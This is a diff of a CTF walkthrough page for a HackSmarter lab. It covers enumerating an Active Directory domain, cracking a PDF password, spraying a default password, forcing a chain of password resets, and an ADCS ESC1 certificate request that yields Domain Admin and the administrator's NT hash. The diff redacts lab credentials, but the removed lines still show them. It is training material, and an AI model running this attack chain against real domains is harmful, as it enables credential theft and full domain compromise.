@@ -10,7 +10,7 @@
   <meta property="og:title" content="Welcome CTF Walkthrough - ADCS ESC1 Certificate Attack | Z3rotrace" />
   <meta property="og:description" content="Complete walkthrough covering Active Directory Certificate Services ESC1 exploitation, BloodHound analysis, PDF password cracking, and privilege escalation to Domain Admin." />
   <meta property="og:image" content="https://z3rotrace.live/assets/welcome/bloodhound-esc1-enrollment.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/welcome.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/welcome.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -166,16 +166,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html" aria-current="page">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html" aria-current="page">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
           <li><a href="anomaly.html">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html">Sysco</a></li>
@@ -216,13 +216,13 @@
   <pre><code>$ nxc ldap 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!'</code></pre>
 
   <pre><code>LDAP        10.1.159.7      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
-LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!</code></pre>
+LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:[REDACTED]</code></pre>
 
   <p>The credentials are valid. Next, I generated a hosts file for easier targeting:</p>
   <pre><code>$ nxc smb 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --generate-hosts-file host_file</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!</code></pre>
+SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:[REDACTED]</code></pre>
 
   <p>Contents of the generated hosts file:</p>
   <pre><code>10.1.159.7     DC01.WELCOME.local WELCOME.local DC01</code></pre>
@@ -232,7 +232,7 @@ SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il
   <pre><code>$ nxc ldap 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --bloodhound --collection All --dns-server 10.1.159.7</code></pre>
 
   <pre><code>LDAP        10.1.159.7      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
-LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
+LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:[REDACTED]
 LDAP        10.1.159.7      389    DC01             Resolved collection methods: rdp, acl, objectprops, dcom, localadmin, session, adcs, group, psremote, container, trusts
 LDAP        10.1.159.7      389    DC01             Done in 0M 27S
 LDAP        10.1.159.7      389    DC01             Collecting ADCS data (CertiHound)...
@@ -286,7 +286,7 @@ LDAP        10.1.159.7      389    DC01             Compressing output into /hom
   <pre><code>$ nxc smb 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --shares</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
+SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:[REDACTED]
 SMB         10.1.159.7      445    DC01             [*] Enumerated shares
 SMB         10.1.159.7      445    DC01             Share           Permissions     Remark
 SMB         10.1.159.7      445    DC01             -----           -----------     ------
@@ -298,7 +298,7 @@ SMB         10.1.159.7      445    DC01             NETLOGON        READ        
 SMB         10.1.159.7      445    DC01             SYSVOL          READ            Logon server share</code></pre>
 
   <p>The <code>Human Resources</code> share looks interesting. I connected and downloaded all files:</p>
-  <pre><code>$ smbclient "//10.1.159.7/Human Resources" -U 'e.hills%Il0vemyj0b2025!'</code></pre>
+  <pre><code>$ smbclient "//10.1.159.7/Human Resources" -U 'e.hills%[REDACTED]'</code></pre>
 
   <pre><code>smb: \> dir
   .                                   D        0  Sat Sep 13 19:20:17 2025
@@ -342,12 +342,12 @@ Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
 Cost 1 (revision) is 4 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-humanresources   (Welcome Start Guide.pdf)
+[REDACTED]   (Welcome Start Guide.pdf)
 1g 0:00:00:03 DONE (2026-01-04 09:16) 0.2604g/s 241800p/s 241800c/s 241800C/s humphrey06..huitar
 Session completed.</code></pre>
 
   <div class="key-finding">
-    <strong>Cracked password:</strong> <code>humanresources</code>
+    <strong>Cracked password:</strong> <code>[REDACTED]</code>
   </div>
 
   <h3><span class="step">[Step 7]</span> Extracting Credentials from the PDF</h3>
@@ -357,7 +357,7 @@ Session completed.</code></pre>
 
   <p>The document reveals:</p>
   <ul>
-    <li>Temporary/default password: <code>Welcome2025!@</code></li>
+    <li>Temporary/default password: <code>[REDACTED]</code></li>
     <li>New employees should change this password on first login</li>
   </ul>
 
@@ -371,12 +371,12 @@ Session completed.</code></pre>
   </div>
 
   <p>I created a list of domain users and sprayed the default password across the network:</p>
-  <pre><code>$ nxc smb 10.1.159.7 -u users_spray -p 'Welcome2025!@'</code></pre>
+  <pre><code>$ nxc smb 10.1.159.7 -u users_spray -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/welcome/password-spray-results.png" alt="Password spray results showing a.harris with valid credentials" loading="lazy"></p>
 
   <div class="key-finding">
-    <strong>Valid credentials found:</strong> <code>a.harris:Welcome2025!@</code>
+    <strong>Valid credentials found:</strong> <code>a.harris:[REDACTED]</code>
   </div>
 
   <h3><span class="step">[Step 9]</span> Exploiting Group Permissions</h3>
@@ -393,24 +393,24 @@ Session completed.</code></pre>
 
   <h3><span class="step">[Step 10]</span> Password Chain Attack</h3>
   <p><strong>Step 1:</strong> Using <code>a.harris</code> to change <code>i.park</code>'s password:</p>
-  <pre><code>$ net rpc password "i.park" 'Zerotrace123!' -U "WELCOME.local/a.harris%Welcome2025!@" -S "DC01.WELCOME.local"
-$ nxc smb 10.1.159.7 -u i.park -p 'Zerotrace123!'</code></pre>
+  <pre><code>$ net rpc password "i.park" '[REDACTED]' -U "WELCOME.local/a.harris%[REDACTED]" -S "DC01.WELCOME.local"
+$ nxc smb 10.1.159.7 -u i.park -p '[REDACTED]'</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.159.7      445    DC01             [+] WELCOME.local\i.park:Zerotrace123!</code></pre>
+SMB         10.1.159.7      445    DC01             [+] WELCOME.local\i.park:[REDACTED]</code></pre>
 
   <p><strong>Step 2:</strong> Using <code>i.park</code> to change <code>SVC_CA</code>'s password:</p>
-  <pre><code>$ net rpc password "SVC_CA" 'Zerotrace123!' -U "WELCOME.local/i.park%Zerotrace123!" -S "DC01.WELCOME.local"
-$ nxc smb 10.1.159.7 -u SVC_CA -p 'Zerotrace123!'</code></pre>
+  <pre><code>$ net rpc password "SVC_CA" '[REDACTED]' -U "WELCOME.local/i.park%[REDACTED]" -S "DC01.WELCOME.local"
+$ nxc smb 10.1.159.7 -u SVC_CA -p '[REDACTED]'</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:Zerotrace123!</code></pre>
+SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:[REDACTED]</code></pre>
 
   <h2>Privilege Escalation - ESC1 Certificate Attack</h2>
 
   <h3><span class="step">[Step 11]</span> Requesting Administrator Certificate</h3>
   <p>With control of <code>SVC_CA</code>, I exploited the ESC1 vulnerability to request a certificate as the Domain Administrator:</p>
-  <pre><code>$ certipy req -u 'SVC_CA@WELCOME.local' -p 'Zerotrace123!' -dc-ip 10.1.159.7 -target 'DC01.WELCOME.local' -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local' -debug</code></pre>
+  <pre><code>$ certipy req -u 'SVC_CA@WELCOME.local' -p '[REDACTED]' -dc-ip 10.1.159.7 -target 'DC01.WELCOME.local' -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'administrator@WELCOME.local' -debug</code></pre>
 
   <pre><code>Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -458,7 +458,7 @@ SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:Zer
 [*] Saving credential cache to 'administrator.ccache'
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a</code></pre>
+[*] Got hash for 'administrator@welcome.local': [REDACTED]:[REDACTED]</code></pre>
 
   <div class="question">
     <strong>What is PKINIT?</strong>
@@ -476,7 +476,7 @@ SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:Zer
     </tr>
     <tr>
       <td><strong>Administrator NT Hash</strong></td>
-      <td><code>0cf1b799460a39c852068b7c0574677a</code></td>
+      <td><code>[REDACTED]</code></td>
     </tr>
   </table>
 
@@ -489,7 +489,7 @@ SMB         10.1.159.7      445    DC01             [+] WELCOME.local\SVC_CA:Zer
 SMB Share "Human Resources" --> Password-protected PDF
     |
     v
-PDF Cracking --> Default password "Welcome2025!@"
+PDF Cracking --> Default password "[REDACTED]"
     |
     v
 Password Spray --> a.harris compromised
